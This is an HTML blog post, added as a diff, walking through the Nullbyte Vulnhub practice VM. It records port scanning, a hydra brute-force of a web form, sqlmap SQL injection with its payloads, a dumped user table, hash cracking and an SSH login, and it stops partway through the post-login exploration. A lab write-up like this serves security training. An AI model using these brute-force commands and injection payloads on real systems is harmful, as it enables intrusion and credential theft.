@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+      <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>Nullbyte Vulnhub Walkthrough</title>
+
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+  <link href="http://localhost:8000" rel="canonical" />
+  <!-- <link rel="shortcut icon" href="static/images/favicon.ico" /> -->
+
+  <!-- Feed -->
+      <link href="https://markclayton.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="_bullz3ye Full Atom Feed" />
+
+  <link href="http://localhost:8000/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="http://localhost:8000/theme/css/code_blocks/github.css" rel="stylesheet">
+
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+    <link href="http://localhost:8000/nullbyte-vulnhub-walkthrough.html" rel="canonical" />
+
+        <meta name="description" content="First blog post. Lately I've been looking at ways to practice my skills as a pentester, and I figured CTFs and practice images would be...">
+
+        <meta name="author" content="Mark Clayton">
+
+
+        <meta property="og:locale" content="" />
+    <meta property="og:site_name" content="_bullz3ye" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="_bullz3ye" />
+    <meta property="og:description" content="...still thinking of a genius subtitle, but I break things." />
+    <meta property="og:url" content="http://localhost:8000" />
+      <meta name="og:image" content="http://localhost:8000/theme/images/post-bg.jpg">
+
+  <meta property="og:type" content="article">
+            <meta property="article:author" content="http://localhost:8000/author/mark-clayton.html">
+  <meta property="og:url" content="http://localhost:8000/nullbyte-vulnhub-walkthrough.html">
+  <meta property="og:title" content="Nullbyte Vulnhub Walkthrough">
+  <meta property="article:published_time" content="2015-12-10 08:23:00-06:00">
+            <meta property="og:description" content="First blog post. Lately I've been looking at ways to practice my skills as a pentester, and I figured CTFs and practice images would be...">
+
+            <meta property="og:image" content="http://localhost:8000/theme/images/post-bg.jpg">
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:site" content="@_bullz3ye">
+        <meta name="twitter:title" content="Nullbyte Vulnhub Walkthrough">
+        <meta name="twitter:url" content="http://localhost:8000/nullbyte-vulnhub-walkthrough.html">
+
+            <meta name="twitter:image:src" content="http://localhost:8000/theme/images/post-bg.jpg">
+
+            <meta name="twitter:description" content="First blog post. Lately I've been looking at ways to practice my skills as a pentester, and I figured CTFs and practice images would be...">
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/" role="presentation">Home</a></li>
+          <li><a href="https://twitter.com/_bullz3ye" role="presentation">Twitter</a></li>
+          <li><a href="mailto:markclayton93@gmail.com" role="presentation">Email</a></li>
+
+
+        <li class="nav-rss"><a href="https://markclayton.github.io/feeds/all.atom.xml"><i class="ic ic-rss"></i> Subscribe</a></li>
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span class="blog-logo">
+                <a href="http://localhost:8000"><img src="images/site-logo.png" alt="Blog Logo" /></a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">Nullbyte Vulnhub Walkthrough</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="http://localhost:8000/author/mark-clayton.html">Mark clayton</a>
+            | <time datetime="Thu 10 December 2015">Thu 10 December 2015</time>
+        </span>
+        <!-- TODO : Modified check -->
+        
+            <div class="post-cover cover" style="background-color: black">
+        
+      </div>
+    </header>    
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <p>First blog post. Lately I've been looking at ways to practice my skills as a pentester, and I figured CTFs and practice images would be the way to go. Something about <a href="https://www.vulnhub.com/">Vulnhub</a> attracting my attention after examining the lot. I believe this is a great way to practice on skills I use everyday on engagements, but also to rehash some techniques rarely used. Personally, I don't find myself reverse engineering an executable on every gig :) Anyway, I figured I would take a swing at <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">Nullbyte</a> written by <a href="https://twitter.com/@ly0nx">lyon</a>.  Let's get started.</p>
+<p>After loading the image, first batter up...nmap. </p>
+<div class="highlight"><pre><span></span><span class="c1"># Nmap 6.49BETA5 scan initiated Wed Dec  9 17:01:29 2015 as: nmap -T4 -A -v -oA nullbyte 192.168.61.147</span>
+Nmap scan report <span class="k">for</span> <span class="m">192</span>.168.61.147
+Host is up <span class="o">(</span><span class="m">0</span>.00073s latency<span class="o">)</span>.
+Not shown: <span class="m">997</span> closed ports
+PORT    STATE SERVICE VERSION
+<span class="m">80</span>/tcp  open  http    Apache httpd <span class="m">2</span>.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+<span class="p">|</span>_http-methods: GET HEAD POST OPTIONS
+<span class="p">|</span>_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+<span class="p">|</span>_http-title: Null Byte <span class="m">00</span> - level <span class="m">1</span>
+<span class="m">111</span>/tcp open  rpcbind <span class="m">2</span>-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
+<span class="p">|</span> rpcinfo: 
+<span class="p">|</span>   program version   port/proto  service
+<span class="p">|</span>   <span class="m">100000</span>  <span class="m">2</span>,3,4        <span class="m">111</span>/tcp  rpcbind
+<span class="p">|</span>   <span class="m">100000</span>  <span class="m">2</span>,3,4        <span class="m">111</span>/udp  rpcbind
+<span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          <span class="m">43382</span>/tcp  status
+<span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          <span class="m">49406</span>/udp  status
+<span class="m">777</span>/tcp open  ssh     OpenSSH <span class="m">6</span>.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol <span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">1024</span> <span class="m">16</span>:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 <span class="o">(</span>DSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">2048</span> <span class="m">29</span>:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> <span class="m">60</span>:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 <span class="o">(</span>ECDSA<span class="o">)</span>
+MAC Address: <span class="m">00</span>:0C:29:95:8C:1C <span class="o">(</span>VMware<span class="o">)</span>
+Device type: general purpose
+Running: Linux <span class="m">3</span>.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux <span class="m">3</span>.2 - <span class="m">3</span>.19
+Uptime guess: <span class="m">0</span>.048 days <span class="o">(</span>since Wed Dec  <span class="m">9</span> <span class="m">15</span>:52:33 <span class="m">2015</span><span class="o">)</span>
+Network Distance: <span class="m">1</span> hop
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">257</span> <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="m">1</span>   <span class="m">0</span>.73 ms <span class="m">192</span>.168.61.147
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="c1"># Nmap done at Wed Dec  9 17:01:38 2015 -- 1 IP address (1 host up) scanned in 9.09 seconds</span>
+</pre></div>
+
+
+<p>We are working ssh on port 777, apache, and rpcbind. Apache first. I curl the website for the initial response. Not really necessary, more habitual. </p>
+<div class="highlight"><pre><span></span>curl http://192.168.61.147/
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Null Byte <span class="m">00</span> - level <span class="m">1</span>&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;
+&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;main.gif&quot;</span>&gt;
+&lt;p&gt; If you search <span class="k">for</span> the laws of harmony, you will find knowledge. &lt;/p&gt;
+&lt;/center&gt;   
+
+&lt;/body&gt;
+&lt;/html&gt;
+</pre></div>
+
+
+<p>Basically just an image, lets see what we have. </p>
+<p><img alt="Just an image?" src="/images/website.png"></p>
+<p>Okay it's really just an image, nothing else it seems. Maybe theres something in the image. My first thought it either metadata or stegonagraphy. Metadata first. After searching the net I come across a tool called <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a>, which is a pretty neat as it extracts the meta information about an image. I'm sure it does alot more, but for the purposes of this test I just need to read the data.</p>
+<div class="highlight"><pre><span></span>./exiftool main.gif
+
+ExifTool Version Number         : <span class="m">10</span>.05
+File Name                       : main.gif
+Directory                       : .
+File Size                       : <span class="m">16</span> kB
+File Modification Date/Time     : <span class="m">2015</span>:12:09 <span class="m">17</span>:08:46-06:00
+File Access Date/Time           : <span class="m">2015</span>:12:09 <span class="m">17</span>:09:09-06:00
+File Inode Change Date/Time     : <span class="m">2015</span>:12:09 <span class="m">17</span>:08:46-06:00
+File Permissions                : rw-r--r--
+File Type                       : GIF
+File Type Extension             : gif
+MIME Type                       : image/gif
+GIF Version                     : 89a
+Image Width                     : <span class="m">235</span>
+Image Height                    : <span class="m">302</span>
+Has Color Map                   : No
+Color Resolution Depth          : <span class="m">8</span>
+Bits Per Pixel                  : <span class="m">1</span>
+Background Color                : <span class="m">0</span>
+Comment                         : P-<span class="o">)</span>: kzMb5nVYJw
+Image Size                      : 235x302
+Megapixels                      : <span class="m">0</span>.071
+</pre></div>
+
+
+<p>Immediately the comment field jumps out, perhaps it's the "P-):"...winky face perhaps? Anyway, obviously we have a key to use. Given the webpage doesn't have any input fields, I figure why not try it as a directory. To my luck...success.</p>
+<p><img alt="use key as file path" src="/images/key.png"></p>
+<p>Okay now we are working with something. Examining the source code of this site gives me the following hint. </p>
+<div class="highlight"><pre><span></span><span class="nt">&lt;center&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">action=</span><span class="s">&quot;index.php&quot;</span><span class="nt">&gt;</span>
+Key:<span class="nt">&lt;br&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">name=</span><span class="s">&quot;key&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span> 
+<span class="nt">&lt;/center&gt;</span>
+<span class="c">&lt;!-- this form isn&#39;t connected to mysql, password ain&#39;t that complex --!&gt;html</span>
+</pre></div>
+
+
+<p>HTTP Post request, with a password that "ain't" that complex...so it's an easy password...brute force? I break out hydra. I'm not to familiar with hydra (I don't do much password cracking) so it took awhile to get the switches to work correctly.</p>
+<div class="highlight"><pre><span></span>hydra <span class="m">192</span>.168.61.147 http-form-post <span class="s2">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span> -P /usr/share/wordlists/rockyou.txt -la <span class="p">|</span> tee nullbyte.hydra
+
+Hydra v8.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2014</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
+
+Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at <span class="m">2015</span>-12-09 <span class="m">17</span>:16:53
+<span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">14344399</span> login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~14008 tries per task
+<span class="o">[</span>DATA<span class="o">]</span> attacking service http-post-form on port <span class="m">80</span>
+<span class="o">[</span><span class="m">80</span><span class="o">][</span>http-post-form<span class="o">]</span> host: <span class="m">192</span>.168.61.147   login: a   password: elite
+<span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at <span class="m">2015</span>-12-09 <span class="m">17</span>:17:16
+</pre></div>
+
+
+<p>This took about 30 seconds surprisingly, password is "elite". Which brings me deeper into the site. </p>
+<p><img alt="Elite worked" src="/images/elite_success.png"></p>
+<p>Entering anything into the parameter gives you the a successful data fetch of what I assume are usernames. Playing around with the input your provide will sometimes give you one or two usernames. This definitely smells like sql injection. Given this is a practice image, I'm was sure sqli would come into play at some point.</p>
+<div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;http://192.168.61.147/kzMb5nVYJw/420search.php?usrtosearch=x&quot;</span> <span class="p">|</span> tee nullbyte.sql
+
+         _
+ ___ ___<span class="p">|</span> <span class="p">|</span>_____ ___ ___  <span class="o">{</span><span class="m">1</span>.0-dev-nongit-20151017<span class="o">}</span>
+<span class="p">|</span>_ -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
+<span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
+<span class="s1">      |_|           |_|   http://sqlmap.org</span>
+
+<span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
+
+<span class="o">[</span>*<span class="o">]</span> starting at <span class="m">17</span>:23:07
+
+<span class="o">[</span><span class="m">17</span>:23:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing connection to the target URL
+<span class="o">[</span><span class="m">17</span>:23:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> the target URL is stable
+<span class="o">[</span><span class="m">17</span>:23:08<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL is stable
+<span class="o">[</span><span class="m">17</span>:23:08<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> is dynamic
+<span class="o">[</span><span class="m">17</span>:23:08<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> does not appear dynamic
+<span class="o">[</span><span class="m">17</span>:23:08<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test</span> shows that GET parameter <span class="s1">&#39;usrtosearch&#39;</span> might be injectable <span class="o">(</span>possible DBMS: <span class="s1">&#39;MySQL&#39;</span><span class="o">)</span>
+<span class="o">[</span><span class="m">17</span>:23:08<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">for</span> SQL injection on GET parameter <span class="s1">&#39;usrtosearch&#39;</span>
+
+it looks like the back-end DBMS is <span class="s1">&#39;MySQL&#39;</span>. Do you want to skip <span class="nb">test</span> payloads specific <span class="k">for</span> other DBMSes? <span class="o">[</span>Y/n<span class="o">]</span> 
+<span class="k">for</span> the remaining tests, <span class="k">do</span> you want to include all tests <span class="k">for</span> <span class="s1">&#39;MySQL&#39;</span> extending provided level <span class="o">(</span><span class="m">1</span><span class="o">)</span> and risk <span class="o">(</span><span class="m">1</span><span class="o">)</span> values? <span class="o">[</span>Y/n<span class="o">]</span> <span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> reflective value<span class="o">(</span>s<span class="o">)</span> found and filtering out
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> seems to be <span class="s1">&#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;</span> injectable 
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 4.1 OR error-based - WHERE, HAVING clause&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL OR error-based - WHERE or HAVING clause&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.0 error-based - Parameter replace&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL inline queries&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt; 5.0.11 stacked queries (SELECT - comment)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt; 5.0.11 stacked queries (SELECT)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt; 5.0.11 stacked queries (comment)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt; 5.0.11 stacked queries&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &lt; 5.0.12 stacked queries (heavy query - comment)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &lt; 5.0.12 stacked queries (heavy query)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:22<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SELECT)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:22<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.0.12 OR time-based blind (SELECT)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:22<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:32<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> seems to be <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)&#39;</span> injectable 
+<span class="o">[</span><span class="m">17</span>:23:32<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:32<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span>
+<span class="o">[</span><span class="m">17</span>:23:32<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> automatically extending ranges <span class="k">for</span> UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
+<span class="o">[</span><span class="m">17</span>:23:32<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL appears to be UNION injectable with <span class="m">3</span> columns
+<span class="o">[</span><span class="m">17</span>:23:32<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> is <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span> injectable
+<span class="o">[</span><span class="m">17</span>:23:32<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> in OR boolean-based injections, please consider usage of switch <span class="s1">&#39;--drop-set-cookie&#39;</span> <span class="k">if</span> you experience any problems during data retrieval
+<span class="o">[</span><span class="m">17</span>:23:32<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> automatically patching output having last char trimmed
+
+GET parameter <span class="s1">&#39;usrtosearch&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span> sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of <span class="m">152</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+---
+Parameter: usrtosearch <span class="o">(</span>GET<span class="o">)</span>
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause <span class="o">(</span>MySQL comment<span class="o">)</span>
+    Payload: <span class="nv">usrtosearch</span><span class="o">=</span>-4968<span class="s2">&quot; OR 5589=5589#</span>
+
+<span class="s2">    Type: AND/OR time-based blind</span>
+<span class="s2">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)</span>
+<span class="s2">    Payload: usrtosearch=x&quot;</span> AND <span class="o">(</span>SELECT * FROM <span class="o">(</span>SELECT<span class="o">(</span>SLEEP<span class="o">(</span><span class="m">5</span><span class="o">)))</span>UcAb<span class="o">)</span><span class="c1">#</span>
+
+    Type: UNION query
+    Title: MySQL UNION query <span class="o">(</span>NULL<span class="o">)</span> - <span class="m">3</span> columns
+    Payload: <span class="nv">usrtosearch</span><span class="o">=</span>x<span class="s2">&quot; UNION ALL SELECT CONCAT(0x716a6a6a71,0x5145485546617555536c,0x7171716b71),NULL,NULL#</span>
+<span class="s2">---</span>
+<span class="s2">[17:23:42] [INFO] the back-end DBMS is MySQL</span>
+<span class="s2">web server operating system: Linux Debian</span>
+<span class="s2">web application technology: Apache 2.4.10</span>
+<span class="s2">back-end DBMS: MySQL 5.0.12</span>
+<span class="s2">[17:23:42] [INFO] fetched data logged to text files under &#39;/root/.sqlmap/output/192.168.61.147&#39;</span>
+
+<span class="s2">[*] shutting down at 17:23:42</span>
+</pre></div>
+
+
+<p>Success! We could start enumerating the available databases, tables, etc. However, why not just dump everything? I append the "--dump-all" switch and <a href="http://linux.101hacks.com/unix/tee-command-examples/">tee</a> the output. After the dump I do a search for ramses, and come across this. </p>
+<div class="highlight"><pre><span></span>Database: seth
+Table: users
+<span class="o">[</span><span class="m">2</span> entries<span class="o">]</span>
++----+---------------------------------------------+--------+------------+
+<span class="p">|</span> id <span class="p">|</span> pass                                        <span class="p">|</span> user   <span class="p">|</span> position   <span class="p">|</span>
++----+---------------------------------------------+--------+------------+
+<span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE <span class="p">|</span> ramses <span class="p">|</span> &lt;blank&gt;    <span class="p">|</span>
+<span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> --not allowed--                             <span class="p">|</span> isis   <span class="p">|</span> employee   <span class="p">|</span>
++----+---------------------------------------------+--------+------------+
+
+<span class="o">[</span><span class="m">17</span>:24:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> table <span class="s1">&#39;seth.users&#39;</span> dumped to CSV file <span class="s1">&#39;/root/.sqlmap/output/192.168.61.147/dump/seth/users.csv&#39;</span>
+</pre></div>
+
+
+<p>There's a hash of some sort for ramses, but not for isis. It doesn't quite look like md5, sha256 perhaps? I don't know. For starters, I pipe it into Burp Suite Decoder and try out the options. After using the Base64 option I get a hash that looks more like a md5. Given it's most likely to be a password of some sort, on an Debian box, most likey md5. Hopefully it is. </p>
+<p><img alt="Burp Decoder" src="/images/base64.png"></p>
+<p>Okay great, now to crack it. We could use <a href="http://www.openwall.com/john/">john</a>, but <a href="https://crackstation.net/">CrackStation</a> is much faster :) This gives us the password of 'omega'. I'm hoping that this will be the credentials for the SSH loggin. Let's give it a shot. </p>
+<div class="highlight"><pre><span></span>ssh -l ramses -p <span class="m">777</span> <span class="m">192</span>.168.61.147
+ramses@192.168.61.147<span class="err">&#39;</span>s password: 
+
+The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for</span> each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Nov <span class="m">26</span> <span class="m">02</span>:28:07 <span class="m">2015</span> from <span class="m">192</span>.168.61.146
+
+ramses@NullByte:~$ ls
+recent_history
+ramses@NullByte:~$ cat recent_history
+sudo -s
+su eric
+<span class="nb">exit</span>
+ls
+clear
+<span class="nb">cd</span> /var/www
+<span class="nb">cd</span> backup/
